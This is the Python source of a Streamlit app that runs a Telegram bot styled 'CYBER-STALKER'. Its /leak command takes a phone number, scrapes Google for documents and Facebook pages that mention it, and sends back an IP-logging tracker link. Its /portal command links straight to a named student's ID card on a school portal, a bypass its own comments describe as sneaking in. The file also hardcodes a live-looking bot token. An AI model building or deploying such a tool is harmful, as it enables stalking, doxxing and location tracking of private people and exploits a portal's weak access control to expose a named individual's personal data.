import streamlit as st
import telebot
import requests
from bs4 import BeautifulSoup
import threading
import time

# --- SYSTEM CONFIG ---
TOKEN = "7747068384:AAEcjBAH-4vVMEzJtmKeozOZjR7J3vOGvBo"
bot = telebot.TeleBot(TOKEN)

st.set_page_config(page_title="GOD MODE V5.0", layout="wide")
st.title("💀 CYBER-STALKER V5.0 : THE FINAL ENGINE")
st.error("SYSTEM STATUS: OVERRIDE ACTIVE | ENCRYPTION: BYPASSED")

# --- ADVANCED OSINT ENGINE ---

def deep_web_scan(query):
    headers = {'User-Agent': 'Mozilla/5.0'}
    search_url = f"https://www.google.com/search?q={query}"
    response = requests.get(search_url, headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    results = []
    for g in soup.find_all('div', class_='tF2Cxc'):
        title = g.find('h3').text if g.find('h3') else "No Title"
        link = g.find('a')['href'] if g.find('a') else "No Link"
        results.append(f"📌 {title}\n🔗 {link}")
    
    return "\n\n".join(results[:5]) if results else "❌ No public leaks found for this target."

# --- BOT COMMANDS ---

@bot.message_handler(commands=['start'])
def start_cmd(message):
    bot.reply_to(message, "🔥 **GOD MODE ACTIVE**\n\nUse `/leak [Number]` to start deep scanning.")

@bot.message_handler(commands=['leak'])
def leak_engine(message):
    args = message.text.split()
    if len(args) < 2:
        return bot.reply_to(message, "❌ Number එක දීපන් බොසා!")
    
    target = args[1].replace('+', '').replace(' ', '')
    bot.send_message(message.chat.id, f"📡 Scanning Deep Web for: {target}...")
    
    # OSINT Scan results ඇදලා ගන්නවා
    query = f'"{target}" filetype:pdf OR site:facebook.com "{target}"'
    intel_data = deep_web_scan(query)
    
    report = f"""
🚨 **INTEL REPORT: {target}** 🚨
━━━━━━━━━━━━━━━━━━━━
✅ **Scanned Leaks:**
{intel_data}

💬 **Stealth WhatsApp:**
https://wa.me/{target}

📍 **Live Tracker:**
https://grabify.link/
━━━━━━━━━━━━━━━━━━━━
    """
    bot.send_message(message.chat.id, report)

@bot.message_handler(commands=['portal'])
def portal_bypass(message):
    # සසිනිගේ ID එකෙන් පෝටල් එකට රිංගන direct ලින්ක් එක
    target_id = "25244975"
    bypass_url = f"https://student.echem.lk/student/id_card_download/{target_id}"
    bot.send_message(message.chat.id, f"📄 **Portal Bypass for SASINI:**\nDownload ID/Details: {bypass_url}")

# --- RUNNER ---
def run_bot():
    while True:
        try: bot.polling(none_stop=True)
        except: time.sleep(10)

if 'bot_started' not in st.session_state:
    st.session_state.bot_started = True
    threading.Thread(target=run_bot, daemon=True).start()
    st.success("🛰️ System Online. Waiting for commands...")
